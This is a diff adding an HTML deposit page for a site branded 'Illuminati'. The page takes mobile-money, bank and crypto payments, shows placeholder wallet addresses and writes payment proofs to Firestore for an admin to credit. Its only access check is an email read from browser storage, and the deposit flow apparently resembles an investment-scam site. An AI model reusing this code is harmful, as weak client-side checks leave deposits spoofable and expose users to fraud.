@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style id="early-anti-flash">html { display: none !important; }</style>
+    <script src="/local-router.js"></script>
+    <script src="security.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Deposit | Illuminati</title>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
+    <style>
+        :root {
+            --bg-primary: #0F172A;
+            --bg-secondary: #1E293B;
+            --bg-tertiary: #334155;
+            --text-primary: #F8FAFC;
+            --text-secondary: #CBD5E1;
+            --gold-color: #F3BA2F;
+            --gold-hover: #FCD34D;
+            --success-color: #10B981;
+            --error-color: #EF4444;
+            --border-color: #475569;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
+            color: var(--text-primary);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        .deposit-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            padding-bottom: 100px;
+        }
+
+        /* Header */
+        .deposit-header {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .deposit-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--gold-color);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Payment Categories */
+        .payment-categories {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .category-card {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .category-card:hover {
+            border-color: var(--gold-color);
+            transform: translateY(-2px);
+        }
+
+        .category-card.active {
+            border-color: var(--gold-color);
+            background: rgba(243, 186, 47, 0.05);
+        }
+
+        .category-icon {
+            font-size: 2rem;
+            color: var(--gold-color);
+            margin-bottom: 12px;
+        }
+
+        .category-title {
+            font-size: 1.125rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+        }
+
+        .category-description {
+            font-size: 0.875rem;
+            color: var(--text-secondary);
+        }
+
+        /* Payment Methods */
+        .payment-methods {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .method-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+        }
+
+        .method-card {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 16px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .method-card:hover {
+            border-color: var(--gold-color);
+            transform: translateY(-1px);
+        }
+
+        .method-card.active {
+            border-color: var(--gold-color);
+            background: rgba(243, 186, 47, 0.1);
+        }
+
+        .method-icon {
+            font-size: 1.5rem;
+            color: var(--gold-color);
+            margin-bottom: 8px;
+        }
+
+        .method-name {
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+        }
+
+        .method-network {
+            font-size: 0.75rem;
+            color: var(--text-secondary);
+        }
+
+        /* Wallet Display */
+        .wallet-display {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .wallet-display.active {
+            display: block;
+        }
+
+        .wallet-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .wallet-title {
+            font-size: 1.125rem;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .wallet-badge {
+            background: rgba(16, 185, 129, 0.1);
+            color: var(--success-color);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .wallet-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            align-items: center;
+        }
+
+        .wallet-info {
+            text-align: center;
+        }
+
+        .wallet-address {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.875rem;
+            color: var(--text-primary);
+            word-break: break-all;
+            margin-bottom: 12px;
+        }
+
+        .copy-btn {
+            background: var(--gold-color);
+            color: var(--bg-primary);
+            border: none;
+            border-radius: 6px;
+            padding: 8px 16px;
+            font-size: 0.875rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .copy-btn:hover {
+            background: var(--gold-hover);
+        }
+
+        .qr-code {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .qr-code canvas {
+            border: 4px solid white;
+            border-radius: 8px;
+        }
+
+        /* Transaction Form */
+        .transaction-form {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .transaction-form.active {
+            display: block;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .form-input {
+            width: 100%;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 12px;
+            color: var(--text-primary);
+            font-size: 0.875rem;
+            transition: all 0.2s ease;
+        }
+
+        .form-input:focus {
+            border-color: var(--gold-color);
+            outline: none;
+        }
+
+        .form-select {
+            width: 100%;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 12px;
+            color: var(--text-primary);
+            font-size: 0.875rem;
+            cursor: pointer;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: var(--gold-color);
+            color: var(--bg-primary);
+            border: none;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 0.875rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .submit-btn:hover {
+            background: var(--gold-hover);
+        }
+
+        /* Bottom Navigation */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: var(--bg-secondary);
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-around;
+            padding: 12px 0;
+            z-index: 100;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: all 0.3s ease;
+            padding: 8px;
+            border-radius: 8px;
+        }
+
+        .nav-item:hover {
+            color: var(--gold-color);
+            background: rgba(243, 186, 47, 0.1);
+        }
+
+        .nav-item.active {
+            color: var(--gold-color);
+        }
+
+        .nav-icon {
+            font-size: 1.25rem;
+        }
+
+        .nav-label {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .payment-categories {
+                grid-template-columns: 1fr;
+            }
+
+            .wallet-content {
+                grid-template-columns: 1fr;
+            }
+
+            .method-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+</head>
+<body>
+    <div class="deposit-container">
+        <!-- Header -->
+        <div class="deposit-header">
+            <div class="deposit-title" data-translate>Deposit Funds</div>
+        </div>
+
+        <!-- Payment Categories -->
+        <div class="payment-categories">
+            <div class="category-card active" onclick="selectCategory('fiat')">
+                <div class="category-icon">
+                    <i class="fas fa-money-bill-wave"></i>
+                </div>
+                <div class="category-title" data-translate>Fiat Currency</div>
+                <div class="category-description" data-translate>MTN, M-Pesa, Orange Money, Bank Transfer</div>
+            </div>
+            <div class="category-card" onclick="selectCategory('crypto')">
+                <div class="category-icon">
+                    <i class="fab fa-bitcoin"></i>
+                </div>
+                <div class="category-title" data-translate>Cryptocurrency</div>
+                <div class="category-description" data-translate>USDT, Bitcoin, Ethereum</div>
+            </div>
+        </div>
+
+        <!-- Fiat Payment Methods -->
+        <div class="payment-methods" id="fiatMethods">
+            <div class="method-grid">
+                <div class="method-card" onclick="selectMethod('mtn')">
+                    <div class="method-icon">
+                        <i class="fas fa-mobile-alt"></i>
+                    </div>
+                    <div class="method-name" data-translate>MTN MoMo</div>
+                    <div class="method-network" data-translate>Mobile Money</div>
+                </div>
+                <div class="method-card" onclick="selectMethod('mpesa')">
+                    <div class="method-icon">
+                        <i class="fas fa-mobile-alt"></i>
+                    </div>
+                    <div class="method-name" data-translate>M-Pesa</div>
+                    <div class="method-network" data-translate>Mobile Money</div>
+                </div>
+                <div class="method-card" onclick="selectMethod('orange')">
+                    <div class="method-icon">
+                        <i class="fas fa-mobile-alt"></i>
+                    </div>
+                    <div class="method-name" data-translate>Orange Money</div>
+                    <div class="method-network" data-translate>Mobile Money</div>
+                </div>
+                <div class="method-card" onclick="selectMethod('bank')">
+                    <div class="method-icon">
+                        <i class="fas fa-university"></i>
+                    </div>
+                    <div class="method-name" data-translate>Bank Transfer</div>
+                    <div class="method-network" data-translate>Direct Wire Transfer</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Crypto Payment Methods -->
+        <div class="payment-methods" id="cryptoMethods" style="display: none;">
+            <div class="method-grid">
+                <div class="method-card" onclick="selectMethod('usdt')">
+                    <div class="method-icon">
+                        <i class="fab fa-usdt"></i>
+                    </div>
+                    <div class="method-name" data-translate>Tether USDT</div>
+                    <div class="method-network" data-translate>TRC20 Network</div>
+                </div>
+                <div class="method-card" onclick="selectMethod('btc')">
+                    <div class="method-icon">
+                        <i class="fab fa-bitcoin"></i>
+                    </div>
+                    <div class="method-name" data-translate>Bitcoin</div>
+                    <div class="method-network" data-translate>BTC Network</div>
+                </div>
+                <div class="method-card" onclick="selectMethod('eth')">
+                    <div class="method-icon">
+                        <i class="fab fa-ethereum"></i>
+                    </div>
+                    <div class="method-name" data-translate>Ethereum</div>
+                    <div class="method-network" data-translate>ERC20 Network</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Crypto Wallet Display -->
+        <div class="wallet-display" id="walletDisplay">
+            <div class="wallet-header">
+                <div class="wallet-title" data-translate>Company Wallet Address</div>
+                <div class="wallet-badge" data-translate>Secure</div>
+            </div>
+            <div class="wallet-content">
+                <div class="wallet-info">
+                    <div class="wallet-address" id="walletAddress">Loading...</div>
+                    <button class="copy-btn" onclick="copyAddress()" data-translate>
+                        <i class="fas fa-copy"></i> Copy Address
+                    </button>
+                </div>
+                <div class="qr-code">
+                    <div id="qrcode"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Transaction Form (for Fiat) -->
+        <div class="transaction-form" id="transactionForm">
+            <h3 style="margin-bottom: 16px; color: var(--gold-color);" data-translate>Submit Transaction Details</h3>
+            <div class="form-group">
+                <label class="form-label" data-translate>Payment Method</label>
+                <select class="form-select" id="paymentMethod">
+                    <option value="" data-translate>Select payment method</option>
+                    <option value="mtn" data-translate>MTN MoMo</option>
+                    <option value="mpesa" data-translate>M-Pesa</option>
+                    <option value="orange" data-translate>Orange Money</option>
+                    <option value="bank" data-translate>Bank Transfer</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label class="form-label" data-translate>Amount (USD)</label>
+                <input type="number" class="form-input" id="amount" placeholder="Enter amount" min="1" data-translate>
+            </div>
+            <div class="form-group">
+                <label class="form-label" data-translate>Transaction ID</label>
+                <input type="text" class="form-input" id="transactionId" placeholder="Enter transaction ID/reference" data-translate>
+            </div>
+            <div class="form-group">
+                <label class="form-label" data-translate>Account Number</label>
+                <input type="text" class="form-input" id="accountNumber" placeholder="Your account number" data-translate>
+            </div>
+            <button class="submit-btn" onclick="submitTransaction()" data-translate>
+                <i class="fas fa-paper-plane"></i> Submit Transaction
+            </button>
+        </div>
+    </div>
+
+    <!-- Bottom Navigation -->
+    <nav class="bottom-nav">
+        <a href="index.html" class="nav-item">
+            <i class="fas fa-home nav-icon"></i>
+            <span class="nav-label" data-translate>Home</span>
+        </a>
+        <a href="elite-dashboard.html" class="nav-item">
+            <i class="fas fa-wallet nav-icon"></i>
+            <span class="nav-label" data-translate>Wallet</span>
+        </a>
+        <a href="settings.html" class="nav-item">
+            <i class="fas fa-cog nav-icon"></i>
+            <span class="nav-label" data-translate>Settings</span>
+        </a>
+    
+    <a href="/alladin.html" class="alladin-nav-item" style="color: #ffd700; font-weight: bold; text-shadow: 0 0 8px rgba(212,175,55,0.6);">ALLADIN AI</a></nav>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCO174C8QbyOodW1e5aQ5PW2pWJ01tO7jE",
+            authDomain: "illuminati---oversight.firebaseapp.com",
+            projectId: "illuminati---oversight",
+            storageBucket: "illuminati---oversight.firebasestorage.app",
+            messagingSenderId: "307854810652",
+            appId: "1:307854810652:web:196f634b4f0ebf4be949d9"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // Global variables
+        let selectedCategory = 'fiat';
+        let selectedMethod = null;
+        let userEmail = localStorage.getItem('gate_email') || localStorage.getItem('userEmail');
+
+        // Crypto wallet addresses
+        const cryptoWallets = {
+            usdt: 'TRXqqQqVQqVQqVQqVQqVQqVQqVQqVQqVQqVQqVQ',
+            btc: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
+            eth: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'
+        };
+
+        // Select category
+        function selectCategory(category) {
+            selectedCategory = category;
+            
+            // Update category cards
+            document.querySelectorAll('.category-card').forEach(card => {
+                card.classList.remove('active');
+            });
+            event.currentTarget.classList.add('active');
+            
+            // Show/hide payment methods
+            document.getElementById('fiatMethods').style.display = category === 'fiat' ? 'block' : 'none';
+            document.getElementById('cryptoMethods').style.display = category === 'crypto' ? 'block' : 'none';
+            
+            // Hide wallet and form
+            document.getElementById('walletDisplay').classList.remove('active');
+            document.getElementById('transactionForm').classList.remove('active');
+            
+            // Reset method selection
+            selectedMethod = null;
+            document.querySelectorAll('.method-card').forEach(card => {
+                card.classList.remove('active');
+            });
+        }
+
+        // Select payment method
+        function selectMethod(method) {
+            selectedMethod = method;
+            
+            // Update method cards
+            document.querySelectorAll('.method-card').forEach(card => {
+                card.classList.remove('active');
+            });
+            event.currentTarget.classList.add('active');
+            
+            if (selectedCategory === 'crypto') {
+                // Show crypto wallet
+                showCryptoWallet(method);
+                document.getElementById('transactionForm').classList.remove('active');
+            } else {
+                // Show fiat transaction form
+                document.getElementById('walletDisplay').classList.remove('active');
+                document.getElementById('transactionForm').classList.add('active');
+                document.getElementById('paymentMethod').value = method;
+            }
+        }
+
+        // Show crypto wallet
+        function showCryptoWallet(method) {
+            const walletDisplay = document.getElementById('walletDisplay');
+            const walletAddress = document.getElementById('walletAddress');
+            const qrcodeDiv = document.getElementById('qrcode');
+            
+            // Set wallet address
+            walletAddress.textContent = cryptoWallets[method];
+            
+            // Generate QR code
+            qrcodeDiv.innerHTML = '';
+            const qr = qrcode(0, 'M');
+            qr.addData(cryptoWallets[method]);
+            qr.make();
+            qrcodeDiv.appendChild(qr.createImgTag(5));
+            
+            // Show wallet display
+            walletDisplay.classList.add('active');
+        }
+
+        // Copy address
+        function copyAddress() {
+            const address = document.getElementById('walletAddress').textContent;
+            navigator.clipboard.writeText(address).then(() => {
+                alert('Address copied to clipboard!');
+            });
+        }
+
+        // Submit transaction
+        function submitTransaction() {
+            const paymentMethod = document.getElementById('paymentMethod').value;
+            const amount = document.getElementById('amount').value;
+            const transactionId = document.getElementById('transactionId').value;
+            const accountNumber = document.getElementById('accountNumber').value;
+            
+            if (!paymentMethod || !amount || !transactionId || !accountNumber) {
+                alert('Please fill in all fields');
+                return;
+            }
+            
+            if (!userEmail) {
+                alert('User session expired. Please login again.');
+                window.location.replace('account-gate.html');
+                return;
+            }
+            
+            // Save transaction to Firestore
+            db.collection('payment_proofs').add({
+                userEmail: userEmail,
+                paymentMethod: paymentMethod,
+                amount: parseFloat(amount),
+                transactionId: transactionId,
+                accountNumber: accountNumber,
+                status: 'pending',
+                submittedAt: new Date().toISOString()
+            }).then(() => {
+                alert('Transaction submitted successfully! Admin will verify and update your balance.');
+                // Reset form
+                document.getElementById('amount').value = '';
+                document.getElementById('transactionId').value = '';
+                document.getElementById('accountNumber').value = '';
+            }).catch((error) => {
+                console.error('Error submitting transaction:', error);
+                alert('Failed to submit transaction. Please try again.');
+            });
+        }
+
+        // Check user authentication
+        function checkAuth() {
+            if (!userEmail) {
+                window.location.replace('account-gate.html');
+                return;
+            }
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            checkAuth();
+        });
+    </script>
+    <script src="global-audio.js"></script>
+    <script src="alladin-engine.js"></script>
+    <!-- ALLADIN Floating Components -->
+    <div class="alladin-trigger hidden" id="alladin-badge">
+        <span>?</span>
+    </div>
+
+</html>
+
+
+
+
+
